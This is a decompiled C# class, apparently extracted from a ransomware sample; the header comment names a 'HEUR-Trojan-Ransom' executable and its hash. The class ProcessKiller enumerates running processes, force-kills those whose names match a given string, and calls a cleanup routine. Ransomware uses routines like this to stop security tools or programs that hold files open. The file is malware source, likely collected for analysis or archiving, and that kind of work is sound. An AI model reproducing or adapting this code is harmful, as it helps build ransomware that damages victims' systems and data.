// Decompiled with JetBrains decompiler
// Type: Complex.ProcessKiller
// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10231E92-BCE6-4007-A463-67D77912E754
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-ec405cc32f21680a9328c4360bd6dc5b660af66209669ca815bebceefb6c3b39.exe

using System;
using System.ComponentModel;
using System.Diagnostics;

namespace Complex
{
  public class ProcessKiller
  {
    public static bool ProcessCompareProductName(Process p, string match)
    {
      try
      {
        return p.ProcessName.ToLower().Contains(match.ToLower());
      }
      catch (Win32Exception ex)
      {
        return false;
      }
      catch (InvalidOperationException ex)
      {
        return false;
      }
      catch (NullReferenceException ex)
      {
        return false;
      }
      catch
      {
        return false;
      }
    }

    public static void ClosingCycle(string names, string dnames)
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (ProcessKiller.ProcessCompareProductName(process, names.ToLower()))
        {
          try
          {
            process.Kill();
            process.WaitForExit();
            Program.CleanMyStuff();
          }
          catch (InvalidOperationException ex)
          {
          }
          catch (PlatformNotSupportedException ex)
          {
            break;
          }
          catch
          {
          }
        }
      }
    }
  }
}
